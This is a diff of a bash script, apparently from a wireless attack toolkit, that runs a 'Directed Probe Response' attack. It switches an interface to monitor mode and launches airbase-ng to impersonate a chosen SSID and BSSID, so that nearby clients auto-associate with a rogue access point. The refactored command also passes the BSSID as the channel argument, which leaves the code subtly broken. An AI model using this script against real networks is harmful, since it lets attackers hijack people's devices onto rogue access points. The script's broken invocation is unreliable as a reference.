@@ -28,51 +28,38 @@
 #   - Automatically enables monitor mode if needed
 #   - Cleans up on SIGINT or timeout using EXIT trap
 #   - Clients previously connected to the spoofed SSID may auto-associate
+#   - Forms the basis for T016
 
-# Load helpers
-SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
-source "$SCRIPT_DIR/config.sh"
-source "$SCRIPT_DIR/print.sh"
+# ─── Paths ───
+BASH_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
+CONFIG_DIR="$BASH_DIR/config"
+HELPERS_DIR="$BASH_DIR/helpers"
+UTILITIES_DIR="$BASH_DIR/utilities"
 
-# Check mdk4
-if ! command -v mdk4 &> /dev/null; then
-    print_fail "mdk4 not found. Please install it first."
-    exit 0
-fi
+# ─── Configs ───
+source "$CONFIG_DIR/global.conf"
+source "$CONFIG_DIR/atk_airbase_probe.conf"
 
-# Cleanup
-cleanup() {
-    print_blank
-    print_info "Starting cleanup"
-    rm -f /tmp/watt_attack_active
-
-    # Check mode
-    MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
-    if [[ "$MODE" != "managed" ]]; then
-        print_action "Reverting to Managed mode"
-        bash "$SCRIPT_DIR/set-mode-managed.sh"
-        print_success "Interface set to Managed mode"
-    fi
-
-    exit 0   
-}
+# ─── Helpers ───
+source "$HELPERS_DIR/fn_print.sh"
+source "$HELPERS_DIR/fn_mode.sh"
+source "$HELPERS_DIR/fn_cleanup.sh"
 
 # Exit traps
 trap cleanup EXIT
 trap cleanup SIGINT
 
 # Validate config vars
-if [[ -z "$INTERFACE" || -z "$T016_PROBE_SSID" || -z "$T016_PROBE_BSSID" || -z "$T016_PROBE_CHANNEL" ]]; then
-    print_warn "Required variables not defined in config.sh: INTERFACE, T016_PROBE_SSID, T016_PROBE_BSSID, or T016_PROBE_CHANNEL"
+if [[ -z "$INTERFACE" || -z "$ATK_PROBE_SSID" || -z "$ATK_PROBE_BSSID" ]]; then
+    print_warn "INTERFACE, ATK_PROBE_SSID, or ATK_PROBE_BSSID not defined in atk_airbase_probe.conf"
     exit 0
 fi
 
 # Display config
 echo "Mode         : T016 - Directed Probe Response"
 echo "Interface    : $INTERFACE"
-echo "Target SSID  : $T016_PROBE_SSID"
-echo "Target BSSID : $T016_PROBE_BSSID"
-echo "Channel      : $T016_PROBE_CHANNEL"
+echo "Target SSID  : $ATK_PROBE_SSID"
+echo "Target BSSID : $ATK_PROBE_BSSID"
 print_blank
 
 # Confirm attack
@@ -86,10 +73,10 @@ fi
 
 # Input duration
 while true; do
-    print_prompt "Duration (seconds) [default: ${ATTACK_DURATION}]: "
+    print_prompt "Duration (seconds) [default: ${ATK_DURATION}]: "
     read -r DURATION
 
-    DURATION="${DURATION:-$ATTACK_DURATION}"
+    DURATION="${DURATION:-$ATK_DURATION}"
     
     if [[ "$DURATION" =~ ^[0-9]+$ ]]; then
         break
@@ -103,18 +90,13 @@ echo "T016" > /tmp/watt_attack_active
 print_blank
 print_info "Starting Attack"
 
-# Check mode
-MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
-if [[ "$MODE" != "monitor" ]]; then
-    print_action "Enabling Monitor mode"
-    bash "$SCRIPT_DIR/set-mode-monitor.sh"
-    print_success "Interface set to Monitor mode"
-fi
+# Set monitor mode
+ensure_monitor_mode
 
 # Run attack
 print_blank
 print_info "Running T016 - Directed Probe Response attack for $DURATION seconds"
-sudo timeout "$DURATION" airbase-ng -e "$T016_PROBE_SSID" -c "$T016_PROBE_CHANNEL" -a "$T016_PROBE_BSSID" "$INTERFACE"
+sudo timeout "$DURATION" airbase-ng -e "$ATK_PROBE_SSID" -c "$ATK_PROBE_BSSID" -a "$ATK_PROBE_BSSID" "$INTERFACE"
 
 EXIT_CODE=$?
 
